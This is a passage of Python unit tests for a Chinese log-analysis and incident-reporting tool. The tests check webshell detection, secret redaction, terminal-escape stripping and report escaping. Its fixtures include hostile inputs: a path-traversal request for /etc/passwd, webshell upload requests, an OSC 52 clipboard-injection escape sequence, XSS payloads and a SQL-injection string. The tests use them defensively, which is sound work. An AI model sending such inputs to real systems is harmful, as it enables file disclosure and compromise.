                    paths=[str(input_path)],
                    outputs=AnalysisOutputs(bundle_dir=str(out_dir)),
                )
            )
            manifest = _json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))

        self.assertEqual(manifest["inputs"][0]["name"], "access.log")
        self.assertEqual(manifest["inputs"][0]["sha256"], expected_hash)
        self.assertEqual(manifest["inputs"][0]["size_bytes"], expected_size)
        manifest_text = _json.dumps(manifest, ensure_ascii=False)
        self.assertNotIn(str(root), manifest_text)
        self.assertNotIn("absolute_path", manifest["inputs"][0])

    def test_cli_bundle_manifest_disambiguates_duplicate_basenames(self):
        content_a = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /admin.php HTTP/1.1\" 404 10 \"-\" \"curl/8\"\n"
        )
        content_b = (
            "198.51.100.10 - - [15/Mar/2024:10:00:01 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n"
        )

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            host_a = root / "host-a"
            host_b = root / "host-b"
            out_dir = root / "report"
            host_a.mkdir()
            host_b.mkdir()
            (host_a / "access.log").write_text(content_a, encoding="utf-8")
            (host_b / "access.log").write_text(content_b, encoding="utf-8")

            completed = subprocess.run(
                [
                    sys.executable,
                    "bla_cli.py",
                    str(host_a / "access.log"),
                    str(host_b / "access.log"),
                    "--out",
                    str(out_dir),
                    "--exit-on",
                    "none",
                    "--no-color",
                    "--max-alerts",
                    "0",
                ],
                cwd=Path(__file__).parents[1],
                text=True,
                encoding="utf-8",
                errors="replace",
                capture_output=True,
                check=False,
            )
            manifest = _json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))

        self.assertEqual(completed.returncode, 0, completed.stderr)
        input_names = {item["name"] for item in manifest["inputs"]}
        parsed_names = {item["name"] for item in manifest["parsed_files"]}
        self.assertEqual(input_names, {"host-a/access.log", "host-b/access.log"})
        self.assertEqual(parsed_names, input_names)
        self.assertEqual(manifest["summary"]["files_analyzed"], 2)
        for item in manifest["inputs"]:
            self.assertEqual(len(item["sha256"]), 64)
            self.assertFalse(Path(item["name"]).is_absolute())
        manifest_text = _json.dumps(manifest, ensure_ascii=False)
        self.assertNotIn(str(root), manifest_text)
        self.assertNotIn("absolute_path", manifest_text)

    def test_cli_manifest_options_use_safe_path_labels(self):
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            secret_root = root / BAD_FILESYSTEM_SEGMENT
            secret_root.mkdir()
            input_path = root / "access.log"
            out_dir = root / "report"
            config_path = secret_root / "thresholds.json"
            allowlist_path = secret_root / "allowlist.json"
            rules_dir = secret_root / "rules-token=super-secret"
            input_path.write_text(content, encoding="utf-8")
            config_path.write_text('{"brute_force_min": 5}', encoding="utf-8")
            allowlist_path.write_text("{}", encoding="utf-8")
            rules_dir.mkdir()

            completed = subprocess.run(
                [
                    sys.executable,
                    "bla_cli.py",
                    str(input_path),
                    "--config",
                    str(config_path),
                    "--allowlist",
                    str(allowlist_path),
                    "--rules",
                    str(rules_dir),
                    "--out",
                    str(out_dir),
                    "--exit-on",
                    "none",
                    "--no-color",
                    "--max-alerts",
                    "0",
                ],
                cwd=Path(__file__).parents[1],
                text=True,
                encoding="utf-8",
                errors="replace",
                capture_output=True,
                check=False,
            )
            manifest = _json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))

        self.assertEqual(completed.returncode, 0, completed.stderr)
        options = manifest["options"]
        self.assertEqual(options["config"], "thresholds.json")
        self.assertEqual(options["allowlist"], "allowlist.json")
        self.assertEqual(options["rules"], ["rules-token=<redacted>"])
        manifest_text = _json.dumps(manifest, ensure_ascii=False)
        self.assertNotIn(str(root), manifest_text)
        self.assertNotIn("\x1b", manifest_text)
        self.assertNotIn("SGVsbG8", manifest_text)
        self.assertNotIn("super-secret", manifest_text)

    def test_report_bundle_sanitizes_terminal_output_paths(self):
        """报告保存提示不得把恶意输出路径中的控制字符或 secret 打到终端。"""
        result = ParseResult("empty.log", "Fixture", [], ParseStats(total=0))
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=0,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / BAD_FILESYSTEM_SEGMENT
            buf = io.StringIO()
            with mock.patch("sys.stdout", buf):
                paths = generate_report_bundle([result], summary, str(out_dir))
            terminal_text = buf.getvalue()
            html_exists = Path(paths["html"]).exists()

        self.assertTrue(html_exists)
        self.assertNotIn("\x1b", terminal_text)
        self.assertNotIn("\x1b]52", terminal_text)
        self.assertNotIn("\x07", terminal_text)
        self.assertNotIn("SGVsbG8", terminal_text)
        self.assertNotIn("super-secret", terminal_text)
        self.assertIn("token=<redacted>", terminal_text)

    def test_json_report_contains_incident_case_view(self):
        """JSON 报告必须包含 incident，便于 explain/API/二次处理。"""
        base = Path(__file__).parent / "fixtures" / "p0"
        result = auto_parse(str(base / "hvv_chain.jsonl"))
        summary = run_detection(result.events, profile="cn-hvv")

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.json"
            generate_json_report([result], summary, str(report_path))
            data = _json.loads(report_path.read_text(encoding="utf-8"))

        self.assertIn("incidents", data)
        self.assertIn("incident_brief", data)
        self.assertEqual(len(data["incidents"]), len(summary.incidents))
        self.assertIn("next_logs", data["incidents"][0])
        self.assertEqual(data["summary"]["risk_score"], summary.risk_score)
        self.assertEqual(data["summary"]["incident_count"], len(summary.incidents))
        self.assertEqual(data["summary"]["alert_count"], len(summary.alerts))
        self.assertIn("by_level", data["summary"])

    def test_incident_brief_reconstructs_error_log_homepage_context_and_webshell(self):
        error_content = (
            '2026/01/18 12:23:04 [error] 2872#3280: *1 FastCGI sent in stderr: "PHP Fatal error"\n'
            '  thrown in E:\\phpstudy_pro\\WWW\\index.php on line 6" while reading response header from upstream, '
            'client: 192.168.11.93, server: localhost, request: "GET / HTTP/1.1", '
            'upstream: "fastcgi://127.0.0.1:9000", host: "192.168.11.93"\n'
        )
        access_content = (
            '192.168.11.93 - - [18/Jan/2026:13:35:23 +0800] '
            '"GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0"\n'
            '192.168.11.39 - - [18/Jan/2026:15:19:00 +0800] '
            '"GET /uploads/shell.php HTTP/1.1" 200 5 "-" "Mozilla/5.0"\n'
            '192.168.11.39 - - [18/Jan/2026:15:19:08 +0800] '
            '"POST /uploads/shell.php HTTP/1.1" 200 5 "-" "Mozilla/5.0"\n'
            '192.168.11.39 - - [19/Jan/2026:15:26:49 +0800] '
            '"GET /index.php?m=admin&c=media&a=fileconnect&cmd=mkfile&name=shell.php HTTP/1.1" '
            '302 5 "-" "python-requests/2.32.5"\n'
        )
        error_result = parse_content(error_content, "error.log", parser_name="generic")
        access_result = parse_web_access(access_content, "access.log")
        summary = run_detection(error_result.events + access_result.events)

        brief = ensure_incident_brief([error_result, access_result], summary)
        markdown = render_incident_brief_markdown(brief)

        self.assertEqual(brief["headline"]["title"], "疑似 Webshell 失陷事件")
        self.assertTrue(brief["attack_paths"])
        first_home = next(item for item in brief["confirmed_facts"] if item["title"] == "首次站点首页访问证据")
        self.assertIn("2026年1月18日12时23分04秒", first_home["summary"])
        self.assertIn("2026/01/18 12:23:04", first_home["summary"])
        self.assertIn("192.168.11.93", first_home["summary"])
        self.assertIn("/uploads/shell.php", markdown)
        self.assertIn("后台文件管理接口可能被滥用", markdown)
        self.assertIn("攻击路径研判", markdown)
        self.assertIn("不能确认", markdown)
        self.assertIn("证据边界", markdown)

        with tempfile.TemporaryDirectory() as tmp:
            html_path = Path(tmp) / "report.html"
            generate_html_report([error_result, access_result], summary, str(html_path))
            html = html_path.read_text(encoding="utf-8")

        self.assertIn("应急研判摘要", html)
        self.assertIn("疑似 Webshell 失陷事件", html)
        self.assertIn("攻击路径研判", html)
        self.assertIn("不能确认 / 风险边界", html)
        self.assertIn("证据边界", html)

        buf = io.StringIO()
        with mock.patch("sys.stdout", buf):
            print_terminal_report([error_result, access_result], summary, no_color=True, max_alerts=0)
        terminal = buf.getvalue()
        self.assertIn("应急研判摘要", terminal)
        self.assertIn("疑似 Webshell 失陷事件", terminal)
        self.assertIn("攻击路径研判", terminal)
        self.assertIn("当前不能确认", terminal)
        self.assertIn("证据边界", terminal)

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.json"
            generate_json_report([error_result, access_result], summary, str(report_path))
            completed = subprocess.run(
                [
                    sys.executable,
                    "bla_cli.py",
                    "explain",
                    "brief",
                    "--report",
                    str(report_path),
                    "--format",
                    "markdown",
                ],
                cwd=Path(__file__).parents[1],
                text=True,
                encoding="utf-8",
                errors="replace",
                capture_output=True,
                check=False,
            )

        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertIn("# BLA 应急研判摘要", completed.stdout)
        self.assertIn("疑似 Webshell 失陷事件", completed.stdout)
        self.assertIn("攻击路径研判", completed.stdout)

        with tempfile.TemporaryDirectory() as tmp:
            text_report_path = Path(tmp) / "report.json"
            generate_json_report([error_result, access_result], summary, str(text_report_path))
            text_completed = subprocess.run(
                [
                    sys.executable,
                    "bla_cli.py",
                    "explain",
                    "brief",
                    "--report",
                    str(text_report_path),
                ],
                cwd=Path(__file__).parents[1],
                text=True,
                encoding="utf-8",
                errors="replace",
                capture_output=True,
                check=False,
            )

        self.assertEqual(text_completed.returncode, 0, text_completed.stderr)
        self.assertIn("关键案情演化", text_completed.stdout)
        self.assertIn("攻击路径研判", text_completed.stdout)
        self.assertIn("疑似落地/上传文件", text_completed.stdout)
        self.assertIn("参与 IP 行为画像", text_completed.stdout)
        self.assertIn("证据边界", text_completed.stdout)

    def test_web_parser_keeps_investigative_baseline_successes_for_briefing(self):
        content = (
            '192.0.2.10 - - [18/Jan/2026:12:00:00 +0800] '
            '"GET / HTTP/1.1" 200 100 "-" "Mozilla/5.0"\n'
            '192.0.2.10 - - [18/Jan/2026:12:00:01 +0800] '
            '"GET /static/app.js HTTP/1.1" 200 100 "-" "Mozilla/5.0"\n'
            '192.0.2.10 - - [18/Jan/2026:12:00:02 +0800] '
            '"POST /login.php HTTP/1.1" 200 100 "-" "Mozilla/5.0"\n'
            '192.0.2.10 - - [18/Jan/2026:12:00:03 +0800] '
            '"GET /admin/account.php HTTP/1.1" 200 100 "-" "Mozilla/5.0"\n'
        )

        result = parse_web_access(content, "access.log")
        messages = [event.message for event in result.events]

        self.assertIn("GET / -> 200", messages)
        self.assertIn("POST /login.php -> 200", messages)
        self.assertNotIn("GET /static/app.js -> 200", messages)
        self.assertNotIn("GET /admin/account.php -> 200", messages)

    def test_incident_brief_does_not_force_webshell_story_on_baseline_web_logs(self):
        content = (
            '192.0.2.10 - - [18/Jan/2026:12:00:00 +0800] '
            '"GET / HTTP/1.1" 200 100 "-" "Mozilla/5.0"\n'
            '192.0.2.10 - - [18/Jan/2026:12:00:02 +0800] '
            '"POST /login.php HTTP/1.1" 200 100 "-" "Mozilla/5.0"\n'
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        brief = ensure_incident_brief([result], summary)

        self.assertNotEqual(brief["headline"]["title"], "疑似 Webshell 失陷事件")
        self.assertEqual(brief["suspected_artifacts"], [])
        self.assertIn("confirmed_facts", brief)

    def test_json_report_strips_controls_redacts_secrets_and_marks_timeline_truncation(self):
        marker = "\x1b]52;c;SGFja2Vk\x07\x1b[31m"
        event = LogEvent(
            id="evt-json",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message=f"{marker}password=hunter2",
            raw_line=f"Authorization: Bearer abcdefghijk{marker}",
            details={"cookie": "session_id=secret123456"},
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1, high=1))
        timeline = [
            TimelineEntry(
                timestamp=f"2024-03-15T10:{idx % 60:02d}:00",
                level=ThreatLevel.INFO,
                category="测试",
                message=f"item {idx}",
                event_id=f"e{idx}",
                source_file="events.log",
            )
            for idx in range(205)
        ]
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=timeline,
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.json"
            generate_json_report([result], summary, str(report_path))
            data = _json.loads(report_path.read_text(encoding="utf-8"))

        text = _json.dumps(data, ensure_ascii=False)
        self.assertNotIn("\x1b]52", text)
        self.assertNotIn("\x1b[31m", text)
        self.assertNotIn("hunter2", text)
        self.assertNotIn("abcdefghijk", text)
        self.assertEqual(data["events"][0]["message"], "password=<redacted>")
        self.assertEqual(len(data["timeline"]), 200)
        self.assertTrue(data["truncation"]["timeline"]["truncated"])

    def test_structured_outputs_sanitize_attacker_controlled_keys_and_refs(self):
        bad_key = BAD_TERMINAL_SEGMENT
        expected_key = "token=<redacted>"
        event = LogEvent(
            id=bad_key,
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message=f"message {bad_key}",
            raw_line=f"raw {bad_key}",
            details={bad_key: "detail-value", "normal": "access_token=super-secret"},
        )
        alert = DetectionAlert(
            id="alert-key",
            rule_id="TEST-KEY",
            rule_name="结构化输出 key 清洗",
            description=f"desc {bad_key}",
            level=ThreatLevel.HIGH,
            category="测试",
            mitre_attack="T1003",
            mitre_phase="凭据访问",
            affected_events=[event.id],
            evidence=[f"evidence {bad_key}"],
            recommendation="review output",
            timestamp=event.timestamp,
            confidence="high",
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1, high=1))
        summary = AnalysisSummary(
            risk_score=80,
            risk_level=ThreatLevel.HIGH,
            alerts=[alert],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            json_path = tmp_path / "report.json"
            manifest_path = tmp_path / "manifest.json"
            sarif_path = tmp_path / "report.sarif"

            generate_json_report([result], summary, str(json_path))
            generate_manifest(
                [result],
                summary,
                str(manifest_path),
                context={"options": {bad_key: "enabled"}},
            )
            generate_sarif_report([result], summary, str(sarif_path))

            json_data = _json.loads(json_path.read_text(encoding="utf-8"))
            manifest = _json.loads(manifest_path.read_text(encoding="utf-8"))
            sarif = _json.loads(sarif_path.read_text(encoding="utf-8"))
            combined_text = "\n".join(
                path.read_text(encoding="utf-8")
                for path in (json_path, manifest_path, sarif_path)
            )

        self.assertIn(expected_key, json_data["events"][0]["details"])
        self.assertNotIn(bad_key, json_data["events"][0]["details"])
        self.assertEqual(json_data["events"][0]["details"][expected_key], "detail-value")
        self.assertEqual(manifest["options"][expected_key], "enabled")
        self.assertEqual(
            sarif["runs"][0]["results"][0]["properties"]["affected_events"],
            [expected_key],
        )
        self.assertNotIn("\x1b]52", combined_text)
        self.assertNotIn("\x07", combined_text)
        self.assertNotIn("SGVsbG8", combined_text)
        self.assertNotIn("super-secret", combined_text)
        self.assertIn(expected_key, combined_text)

    def test_json_report_can_limit_or_omit_events_and_raw_lines(self):
        events = [
            LogEvent(
                id=f"evt-{idx}",
                timestamp="2024-03-15T10:00:00",
                level=ThreatLevel.INFO,
                category="测试",
                source="fixture",
                source_file="events.log",
                message=f"event {idx}",
                raw_line="abcdefghi",
            )
            for idx in range(3)
        ]
        result = ParseResult("events.log", "Fixture", events, ParseStats(total=3, info=3))
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=3,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            limited_path = Path(tmp) / "limited.json"
            generate_json_report([result], summary, str(limited_path), events_limit=2, raw_line_limit=5)
            limited = _json.loads(limited_path.read_text(encoding="utf-8"))

            omitted_path = Path(tmp) / "omitted.json"
            generate_json_report([result], summary, str(omitted_path), include_events=False)
            omitted = _json.loads(omitted_path.read_text(encoding="utf-8"))

        self.assertEqual(len(limited["events"]), 2)
        self.assertEqual(limited["events"][0]["raw_line"], "abcde")
        self.assertTrue(limited["events"][0]["raw_line_truncated"])
        self.assertEqual(limited["events"][0]["raw_line_length"], 9)
        self.assertEqual(limited["truncation"]["events"]["total"], 3)
        self.assertEqual(limited["truncation"]["events"]["returned"], 2)
        self.assertTrue(limited["truncation"]["events"]["truncated"])
        self.assertFalse(omitted["truncation"]["events"]["included"])
        self.assertEqual(omitted["events"], [])

    def test_html_report_renders_incident_killchain_chips(self):
        """HTML 报告 incident 卡片必须画出 mini kill chain，命中阶段 chip 高亮。"""
        from bla.detection.correlation import correlate_incidents
        from bla.models import LogEvent as _LE
        from bla.models import ParseResult, ParseStats

        events = [
            _LE(
                id="e1", timestamp="2026-05-08T10:00:00",
                level=ThreatLevel.CRITICAL, category="测试", source="t",
                source_file="t.log", message="m", raw_line="",
                ip="9.9.9.9", user="alice", host="h1",
                details={
                    "src_ip": "9.9.9.9", "account": "alice", "asset": "h1",
                    "event_family": "initial-access", "source_type": "waf",
                },
            )
        ]
        incidents = correlate_incidents(events, [])
        summary = AnalysisSummary(
            risk_score=80, risk_level=ThreatLevel.HIGH, alerts=[],
            timeline=[], attack_chain=[], recommendations=[],
            total_events=1, files_analyzed=1, incidents=incidents,
        )
        result = ParseResult(file_name="t.log", log_type="test",
                             events=events, stats=ParseStats(total=1))

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(path))
            html = path.read_text(encoding="utf-8")
        self.assertIn("incident-killchain", html)
        self.assertIn("kc-chip", html)
        self.assertIn("kc-hit", html, "命中阶段必须以高亮 chip 渲染")
        self.assertIn("kc-miss", html, "未命中阶段也要渲染（灰色）")

    def test_html_report_groups_repeated_identity_incidents_for_display(self):
        """HTML 展示层应合并只差源 IP 的身份突破案件，JSON 原始数据仍可逐案保留。"""
        from bla.models import Incident

        events = [
            LogEvent(
                id="e1", timestamp="2024-03-15T10:00:00",
                level=ThreatLevel.HIGH, category="认证", source="linux-auth",
                source_file="auth.log", message="failed root from 1.1.1.1", raw_line="",
                ip="1.1.1.1", user="root", host="host1",
                details={"source_type": "linux-auth", "src_ip": "1.1.1.1", "account": "root", "asset": "host1"},
            ),
            LogEvent(
                id="e2", timestamp="2024-03-15T10:01:00",
                level=ThreatLevel.HIGH, category="认证", source="linux-auth",
                source_file="auth.log", message="failed admin from 2.2.2.2", raw_line="",
                ip="2.2.2.2", user="admin", host="host1",
                details={"source_type": "linux-auth", "src_ip": "2.2.2.2", "account": "admin", "asset": "host1"},
            ),
            LogEvent(
                id="e3", timestamp="2024-03-15T10:02:00",
                level=ThreatLevel.CRITICAL, category="Web", source="waf",
                source_file="access.log", message="web exploit", raw_line="",
                ip="9.9.9.9", host="web1",
                details={"source_type": "waf", "src_ip": "9.9.9.9", "asset": "web1"},
            ),
        ]
        timeline = [
            TimelineEntry(
                timestamp=item.timestamp, level=item.level, category=item.category,
                message=item.message, event_id=item.id, source_file=item.source_file,
            )
            for item in events
        ]
        incidents = [
            Incident(
                id="inc-001", title="严重案件: 9.9.9.9 / 初始访问",
                description="web incident", level=ThreatLevel.CRITICAL, confidence="high",
                affected_alerts=[], affected_events=["e3"], source_ips=["9.9.9.9"],
                accounts=[], assets=["web1"], source_types=["waf"], attack_phases=["初始访问"],
                evidence=["日志源: waf"], timeline=[timeline[2]],
                recommended_actions=["核查入口"], next_logs=["WAF 原始命中详情"],
            ),
            Incident(
                id="inc-002", title="高危案件: 1.1.1.1 / 身份突破",
                description="identity 1", level=ThreatLevel.HIGH, confidence="medium",
                affected_alerts=[], affected_events=["e1"], source_ips=["1.1.1.1"],
                accounts=["root"], assets=["host1"], source_types=["linux-auth"], attack_phases=["身份突破"],
                evidence=["来源IP: 1.1.1.1"], timeline=[timeline[0]],
                recommended_actions=["核查账号登录源"], next_logs=["AD/域控 Security 日志"],
            ),
            Incident(
                id="inc-003", title="高危案件: 2.2.2.2 / 身份突破",
                description="identity 2", level=ThreatLevel.HIGH, confidence="medium",
                affected_alerts=[], affected_events=["e2"], source_ips=["2.2.2.2"],
                accounts=["admin"], assets=["host1"], source_types=["linux-auth"], attack_phases=["身份突破"],
                evidence=["来源IP: 2.2.2.2"], timeline=[timeline[1]],
                recommended_actions=["核查账号登录源"], next_logs=["AD/域控 Security 日志"],
            ),
        ]
        result = ParseResult("auth.log", "linux-auth", events, ParseStats(total=3, critical=1, high=2))
        summary = AnalysisSummary(
            risk_score=80, risk_level=ThreatLevel.CRITICAL, alerts=[],
            timeline=timeline, attack_chain=[], recommendations=[],
            total_events=3, files_analyzed=1, incidents=incidents,
        )

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(path))
            html = path.read_text(encoding="utf-8")

        self.assertEqual(html.count('class="incident-card"'), 2)
        self.assertIn("应急案件视图 (3) · 合并展示 2 组", html)
        self.assertIn("身份突破攻击活动（合并）", html)
        self.assertIn("合并案件: 2 个", html)
        self.assertIn("来源IP数: 2", html)

    def test_explain_markdown_format_renders_ticket_ready_doc(self):
        """explain --format markdown 应当产出可直接粘贴进工单的 Markdown。"""
        from bla_cli import _render_alert_markdown, _render_incident_markdown

        incident = {
            "id": "inc-001",
            "title": "测试案件",
            "level": "critical",
            "confidence": "high",
            "description": "9.9.9.9 攻击 web1",
            "affected_event_count": 5,
            "affected_alerts": ["a1", "a2"],
            "source_types": ["waf", "edr"],
            "attack_phases": ["初始访问", "主机失陷"],
            "source_ips": ["9.9.9.9"],
            "accounts": ["alice"],
            "assets": ["web1"],
            "evidence": ["日志源: waf, edr", "命中规则: WEB-SQLI"],
            "recommended_actions": ["隔离主机", "重置密码"],
            "next_logs": ["EDR 进程树"],
            "timeline": [
                {"timestamp": "2026-05-08T10:00:00", "level": "critical",
                 "source_file": "waf.log", "message": "SQL 注入命中"},
            ],
        }
        md = _render_incident_markdown(incident)
        self.assertIn("## 案件 inc-001：测试案件", md)
        self.assertIn("**级别**：critical", md)
        self.assertIn("**攻击阶段**：初始访问 → 主机失陷", md)
        self.assertIn("- [ ] 隔离主机", md)
        self.assertIn("| 时间 | 级别 | 来源 | 描述 |", md)
        self.assertIn("SQL 注入命中", md)

        alert_md = _render_alert_markdown({
            "id": "a1", "rule_id": "WEB-SQLI", "rule_name": "SQL注入",
            "level": "critical", "confidence": "high",
            "mitre_attack": "T1190", "mitre_phase": "初始访问",
            "affected_event_count": 1, "timestamp": "2026-05-08T10:00:00",
            "description": "...", "evidence": ["payload=union select"],
            "recommendation": "部署 WAF",
        })
        self.assertIn("## 告警 a1：SQL注入", alert_md)
        self.assertIn("**MITRE**：T1190 / 初始访问", alert_md)
        self.assertIn("- payload=union select", alert_md)
        self.assertIn("部署 WAF", alert_md)

    def test_explain_markdown_escapes_attacker_controlled_report_fields(self):
        from bla_cli import _render_alert_markdown

        marker = "\x1b]52;c;SGFja2Vk\x07\x1b[31m"
        md = _render_alert_markdown({
            "id": "a|1",
            "rule_id": "WEB|XSS",
            "rule_name": f"<script>alert(1)</script>{marker}",
            "level": "high",
            "confidence": "high",
            "mitre_attack": "T1190",
            "mitre_phase": "初始访问",
            "affected_event_count": 1,
            "timestamp": "2026-05-08T10:00:00",
            "description": "token=supersecret",
            "evidence": ["payload|<img src=x onerror=1>"],
            "recommendation": "Cookie: abcdef123456",
        })

        self.assertNotIn("\x1b]52", md)
        self.assertNotIn("<script>", md)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", md)
        self.assertIn("a\\|1", md)
        self.assertIn("payload\\|&lt;img src=x onerror=1&gt;", md)
        self.assertIn("token=&lt;redacted&gt;", md)
        self.assertIn("Cookie=&lt;redacted&gt;", md)
